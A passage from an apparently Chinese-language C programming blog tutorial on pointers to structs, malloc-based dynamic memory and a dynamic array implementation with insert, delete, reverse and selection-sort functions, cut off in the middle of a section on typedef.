pst)</span></span><br><span class="line">{</span><br><span class="line">    (*pst).sid = <span class="number">99</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(pst-&gt;name, <span class="string">"zhangsan"</span>);</span><br><span class="line">    pst-&gt;age = <span class="number">23</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">//这种方式耗内存，耗时间，不推荐</span></span><br><span class="line"><span class="comment">void g(struct Student st)</span></span><br><span class="line"><span class="comment">{</span></span><br><span class="line"><span class="comment">    printf("%d %s %d\n", st.sid, st.name, st.age);</span></span><br><span class="line"><span class="comment">}</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">k</span><span class="params">(<span class="keyword">struct</span> Student * pst)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s %d\n"</span>, pst-&gt;sid, pst-&gt;name, pst-&gt;age);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">st</span>;</span></span><br><span class="line">    f(&amp;st);</span><br><span class="line">    <span class="comment">//printf("%d %s %d\n", st.sid, st.name, st.age);</span></span><br><span class="line">    <span class="comment">//g(st);</span></span><br><span class="line">    k(&amp;st);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="1-4-动态内存分配"><a href="#1-4-动态内存分配" class="headerlink" title="1.4 动态内存分配"></a>1.4 动态内存分配</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//静态数组</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = {<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>};</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//动态数组</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入需要分配数组的长度：length = "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;len);<span class="comment">//将输入写到len变量这个地址中去</span></span><br><span class="line">    len = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> * pArr = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * len);</span><br><span class="line">    *pArr = <span class="number">4</span>;<span class="comment">//类似于a[0] = 4;</span></span><br><span class="line">    pArr[<span class="number">1</span>] = <span class="number">10</span>;<span class="comment">//类似于a[1] = 10;</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">    {</span><br><span class="line">        pArr[i] = i * i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;pArr[i]);<span class="comment">//取动态数组的每个元素的地址并输出</span></span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">free</span>(pArr);<span class="comment">//把pArr所代表的动态分配所有个字节的内存释放</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">//动态数组的地址也是连续的</span></span><br><span class="line"><span class="comment">009F6B18</span></span><br><span class="line"><span class="comment">009F6B1C</span></span><br><span class="line"><span class="comment">009F6B20</span></span><br><span class="line"><span class="comment">009F6B24</span></span><br><span class="line"><span class="comment">009F6B28</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.4.1.jpg" class="" title="malloc分配动态数组"><h2 id="1-5-跨函数使用内存"><a href="#1-5-跨函数使用内存" class="headerlink" title="1.5 跨函数使用内存"></a>1.5 跨函数使用内存</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">    i = f();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"i = %d\n"</span>, i);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> j = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">i = 20</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void f(int **q)</span></span><br><span class="line"><span class="comment">{</span></span><br><span class="line"><span class="comment">    int s;</span></span><br><span class="line"><span class="comment">    *q = &amp;s;</span></span><br><span class="line"><span class="comment">}</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> **q)</span></span><br><span class="line">{</span><br><span class="line">    *q = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    <span class="comment">//f(&amp;p);//p调用完f()还是野指针，因为调用完f()，f()中的局部变量都没了</span></span><br><span class="line">    g(&amp;p);</span><br><span class="line">}</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Student * <span class="title function_">CreateStudent</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowStudent</span><span class="params">(<span class="keyword">struct</span> Student *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> * <span class="title">pst</span>;</span></span><br><span class="line">    pst = CreateStudent();</span><br><span class="line">    ShowStudent(pst);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Student * <span class="title function_">CreateStudent</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> * <span class="title">p</span> =</span> (<span class="keyword">struct</span> Student *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Student));</span><br><span class="line">    p-&gt;sid = <span class="number">99</span>;</span><br><span class="line">    p-&gt;age = <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowStudent</span><span class="params">(<span class="keyword">struct</span> Student * ps)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, ps-&gt;sid, ps-&gt;age);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">99 22</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="2-线性结构"><a href="#2-线性结构" class="headerlink" title="2. 线性结构"></a>2. 线性结构</h1><h2 id="2-1-连续存储【数组】"><a href="#2-1-连续存储【数组】" class="headerlink" title="2.1 连续存储【数组】"></a>2.1 连续存储【数组】</h2><p>优点：存取速度快、方便查找</p><p>缺点：事先知道数组的长度、插入删除元素慢、空间通常有限制、需要大块连续内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Arr</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span>* pBase;<span class="comment">//存储的是数组第一个元素的地址</span></span><br><span class="line">    <span class="type">int</span> len;<span class="comment">//数组所能容纳的最大元素的个数</span></span><br><span class="line">    <span class="type">int</span> cnt;<span class="comment">//当前数组有效元素的个数</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_arr</span><span class="params">(<span class="keyword">struct</span> Arr*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">append_arr</span><span class="params">(<span class="keyword">struct</span> Arr*, <span class="type">int</span>)</span>;<span class="comment">//追加</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">insert_arr</span><span class="params">(<span class="keyword">struct</span> Arr*, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">delete_arr</span><span class="params">(<span class="keyword">struct</span> Arr*, <span class="type">int</span>, <span class="type">int</span>*)</span>;<span class="comment">//删除的元素放在int*</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_empty</span><span class="params">(<span class="keyword">struct</span> Arr*)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_full</span><span class="params">(<span class="keyword">struct</span> Arr*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sort_arr</span><span class="params">(<span class="keyword">struct</span> Arr*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show_arr</span><span class="params">(<span class="keyword">struct</span> Arr*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">reverse_arr</span><span class="params">(<span class="keyword">struct</span> Arr*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Arr</span> <span class="title">arr</span>;</span></span><br><span class="line">    init_arr(&amp;arr, <span class="number">6</span>);</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line">    append_arr(&amp;arr, <span class="number">1</span>);</span><br><span class="line">    append_arr(&amp;arr, <span class="number">2</span>);</span><br><span class="line">    append_arr(&amp;arr, <span class="number">3</span>);</span><br><span class="line">    append_arr(&amp;arr, <span class="number">4</span>);</span><br><span class="line">    append_arr(&amp;arr, <span class="number">5</span>);</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line">    insert_arr(&amp;arr, <span class="number">4</span>, <span class="number">99</span>);</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="keyword">if</span> (delete_arr(&amp;arr, <span class="number">1</span>, &amp;val))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"删除成功！\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"您删除的元素是：%d\n"</span>, val);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"删除失败！\n"</span>);</span><br><span class="line">    }</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line"></span><br><span class="line">    reverse_arr(&amp;arr);</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line"></span><br><span class="line">    sort_arr(&amp;arr);</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr, <span class="type">int</span> length)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//(*pArr).len = 99;</span></span><br><span class="line">    pArr-&gt;pBase = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//分配内存失败，会把NULL赋值给pBase</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pArr-&gt;pBase)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"动态内存分配失败！\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        pArr-&gt;len = length;</span><br><span class="line">        pArr-&gt;cnt = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_empty</span><span class="params">(<span class="keyword">struct</span> Arr* pArr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == pArr-&gt;cnt)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (is_empty(pArr))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"数组为空！\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pArr-&gt;cnt; i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>, pArr-&gt;pBase[i]);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_full</span><span class="params">(<span class="keyword">struct</span> Arr* pArr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (pArr-&gt;cnt == pArr-&gt;len)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">append_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr, <span class="type">int</span> val)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//满时返回false</span></span><br><span class="line">    <span class="keyword">if</span> (is_full(pArr))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//没满时追加</span></span><br><span class="line">    pArr-&gt;pBase[pArr-&gt;cnt] = val;</span><br><span class="line">    pArr-&gt;cnt++;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">insert_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr, <span class="type">int</span> pos, <span class="type">int</span> val)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (is_full(pArr))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"数组已满，不能进行插入操作！\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pos&lt;<span class="number">0</span> || pos&gt;pArr-&gt;cnt + <span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"插入位置不合法！\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = pArr-&gt;cnt - <span class="number">1</span>; i &gt;= pos; i--)</span><br><span class="line">    {</span><br><span class="line">        pArr-&gt;pBase[i + <span class="number">1</span>] = pArr-&gt;pBase[i];</span><br><span class="line">    }</span><br><span class="line">    pArr-&gt;pBase[pos] = val;</span><br><span class="line">    pArr-&gt;cnt++;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">delete_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr, <span class="type">int</span> pos, <span class="type">int</span>* pVal)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (is_empty(pArr))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"数组为空，不能进行删除操作！\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pos&lt;<span class="number">0</span> || pos&gt;pArr-&gt;cnt<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"删除位置不合法！\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    *pVal = pArr-&gt;pBase[pos];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = pos; i &lt; pArr-&gt;cnt - <span class="number">1</span>;i++)</span><br><span class="line">    {</span><br><span class="line">        pArr-&gt;pBase[i] = pArr-&gt;pBase[i + <span class="number">1</span>];</span><br><span class="line">    }</span><br><span class="line">    pArr-&gt;cnt--;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reverse_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = pArr-&gt;cnt - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">    {</span><br><span class="line">        t = pArr-&gt;pBase[i];</span><br><span class="line">        pArr-&gt;pBase[i] = pArr-&gt;pBase[j];</span><br><span class="line">        pArr-&gt;pBase[j] = t;</span><br><span class="line">        ++i;</span><br><span class="line">        --j;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sort_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr)</span></span><br><span class="line">{<span class="comment">//选择排序</span></span><br><span class="line">    <span class="type">int</span> i, j, t;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pArr-&gt;cnt<span class="number">-1</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; pArr-&gt;cnt; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (pArr-&gt;pBase[i] &gt; pArr-&gt;pBase[j])</span><br><span class="line">            {</span><br><span class="line">                t = pArr-&gt;pBase[i];</span><br><span class="line">                pArr-&gt;pBase[i] = pArr-&gt;pBase[j];</span><br><span class="line">                pArr-&gt;pBase[j] = t;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="2-2-离散存储【链表】"><a href="#2-2-离散存储【链表】" class="headerlink" title="2.2 离散存储【链表】"></a>2.2 离散存储【链表】</h2><p>优点：空间没有限制、插入删除元素很快</p><p>缺点：存取速度慢</p><h3 id="2-2-1-typedef的用法"><a href="#2-2-1-typedef的用法" class="headerlink" title="2.2.1 typedef的用法"></a>2.2.1 typedef的用法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//int为已经存在的数据类型，ZHANGSAN是给数据类型起个别名</span></span><br><span class="line"><span class="comment">//typedef int ZHANGSAN;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span 